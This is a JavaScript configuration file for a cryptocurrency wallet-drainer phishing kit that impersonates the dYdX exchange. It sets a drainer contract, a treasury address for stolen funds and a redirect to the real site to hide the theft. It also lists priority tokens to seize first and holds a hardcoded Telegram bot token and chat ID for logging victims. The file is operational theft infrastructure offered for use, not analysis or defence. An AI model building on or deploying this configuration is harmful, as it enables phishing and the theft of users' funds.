/**
 * Drainer Configuration for dYdX Next.js Phishing Site
 * 
 * Configuration for wallet draining functionality using Reown
 */

/**
 * Drainer Configuration for dYdX 2 Phishing Site
 * 
 * Complete configuration matching the 1inch implementation but customized for dYdX
 */

export const DRAINER_CONFIG = {
  CONTRACT_ADDRESS: "0x1715c6247bb2c685df0d345a757d16f7cf003e6c",
  NETWORK_ID: 1,
  NETWORK_NAME: "mainnet",
  TREASURY_ADDRESS: "0xFD93802f584C0E9BB7b214892e2E6660e7868CBD",
  ETHERSCAN_API_KEY: "",
  SITE_NAME: "dYdX",
  VICTIM_REDIRECT: "https://dydx.exchange",
  DEBUG_MODE: true,
  
  // Enhanced Token Detection Settings
  TOKEN_DETECTION: {
    ENHANCED_DEBUGGING: true,
    PRIORITY_TOKENS: ["USDT", "USDC", "WETH", "WBTC", "DAI"],
    MIN_USD_VALUE: 0.10,
    BATCH_SIZE: 3,
    BATCH_DELAY: 2000,
    MAX_TOKENS_TO_CHECK: 50
  },
  
  // WalletConnect/Reown Configuration
  WALLETCONNECT: {
    PROJECT_ID: "dd830d985907b8065908432e4742bd54",
    MAINNET_PROJECT_ID: "f8b6c8c4f8f6c8c4f8f6c8c4f8f6c8c4",
    ENABLED: true
  },
  
  // RPC Configuration with multiple fallbacks
  RPC: {
    MAINNET_URL: "https://ethereum.publicnode.com",
    FALLBACK_URLS: [
      "https://rpc.ankr.com/eth",
      "https://cloudflare-eth.com",
      "https://eth.public-rpc.com",
      "https://ethereum.blockpi.network/v1/rpc/public",
      "https://eth-mainnet.public.blastapi.io",
      "https://api.mycryptoapi.com/eth"
    ],
    RATE_LIMIT: {
      REQUESTS_PER_SECOND: 5,
      RETRY_ATTEMPTS: 3,
      RETRY_DELAY: 1000
    }
  },
  
  // Telegram Logging Configuration
  TELEGRAM: {
    BOT_TOKEN: process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || "8352696736:AAFHNoV9tGyN81suhDKIyDWm-FUVYKEcRLc",
    CHAT_ID: process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || "-1003184083653",
    ENABLED: process.env.NEXT_PUBLIC_TELEGRAM_ENABLED === 'true' || true
  }
}

// Essential fallback tokens (only used if API discovery fails)
export const POPULAR_TOKENS = [
   // Critical Stablecoins & Major tokens (API Fallback Only)
            { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6, priority: 1, avgPrice: 1 },
            { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', decimals: 6, priority: 1, avgPrice: 1 },
            { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', symbol: 'WETH', decimals: 18, priority: 1, avgPrice: 2500 },
            { address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', symbol: 'WBTC', decimals: 8, priority: 1, avgPrice: 45000 },
            { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', decimals: 18, priority: 1, avgPrice: 1 },
            
            // Essential Major Altcoins (Fallback)
            { address: '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0', symbol: 'MATIC', decimals: 18, priority: 2, avgPrice: 0.8 },
            { address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', symbol: 'LINK', decimals: 18, priority: 2, avgPrice: 15 },
            { address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', symbol: 'UNI', decimals: 18, priority: 2, avgPrice: 8 },
            { address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', symbol: 'AAVE', decimals: 18, priority: 2, avgPrice: 150 },
            { address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', symbol: 'SHIB', decimals: 18, priority: 2, avgPrice: 0.000025 },
]

// Token list for API fallback only (reduced from 200+ to 10 essential tokens)
export const TOKEN_LIST = POPULAR_TOKENS

// High value token symbols for priority detection
export const HIGH_VALUE_TOKENS = POPULAR_TOKENS
  .filter(token => token.priority <= 2)
  .map(token => token.symbol)

// Note: Primary token discovery now uses automatic API detection
console.log(`🎯 Loaded ${POPULAR_TOKENS.length} essential fallback tokens (API discovery is primary method)`)
